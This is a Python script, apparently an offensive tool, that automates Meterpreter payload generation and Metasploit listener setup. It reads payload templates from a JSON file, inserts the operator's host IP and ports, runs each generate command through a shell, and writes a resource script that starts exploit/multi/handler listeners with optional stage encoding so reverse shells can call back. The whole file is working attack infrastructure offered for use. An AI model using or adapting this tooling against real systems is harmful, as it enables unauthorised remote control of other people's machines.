import sys
import os
import json
import argparse
import subprocess

# print(data)
def generate_payload(data,host,dest_dir=None):
    previous_path=os.getcwd()
    if dest_dir:
        os.chdir(dest_dir)
    else:
        if os.path.exists('payloads'):
            os.chdir('payloads')
        else:
            os.mkdir('payloads')
            os.chdir('payloads')

    for listener in data:
        for payload in listener['payloads']:
            print('generating payload:',payload['name'],'....')
            cmd=payload['generate'].replace('<host>',host).replace('<port>',str(listener['port']))
            print(cmd)
            # cmd = cmd.split()
            p = subprocess.Popen(cmd,
                                stdout=subprocess.PIPE,
                                stderr=subprocess.STDOUT,
                                shell=True)

            for line in iter(p.stdout.readline, b''):
                print(line.decode('GBK'))

    os.chdir(previous_path)

def generate_special_usage(data):
    with open('special_usage.txt','w') as f:
        for listener in data:
            for payload in listener['payloads']:
                try:
                    f.write(payload['name']+':\n\t'+payload['usage']+'\n')
                except KeyError:
                    pass
                
def generate_msf_resource_scipt(data):
    f = open('setup_listener.rc','w')
    for listener in data:
        f.write('use exploit/multi/handler\n')
        f.write('set payload '+listener['payload_name']+'\n')
        f.write('set lport '+str(listener['port'])+'\n')
        f.write('set lhost 0.0.0.0\n')
        f.write('set exitonsession false\n')
        if 'stageencoder' in listener:
            f.write('set enablestageencoding true\n')
            f.write('set stageencoder '+listener['stageencoder']+'\n')
        f.write('run -j\n\n')
    
    f.close()


if __name__=='__main__':

    parser = argparse.ArgumentParser(description='setup your meterpreter payloads')
    parser.add_argument('host',help='ip of your host')
    parser.add_argument('-o','--dest_dir',help='destination dir')
    # parser.add_argument('--sum', dest='accumulate', action='store_const',
    #                     const=sum, default=max,
    #                     help='sum the integers (default: find the max)')

    # print(sys.argv)
    args = parser.parse_args()
    #args = parser.parse_args(['1.1.1.1'])
    # args = parser.parse_args(['1.1.1.1'])
    print(args)

    with open('all_payload.json','r') as f:
        json_data = f.read()

    data = json.loads(json_data)
    # print(data)
    generate_payload(data,args.host,dest_dir=args.dest_dir)
    generate_special_usage(data)
    generate_msf_resource_scipt(data)
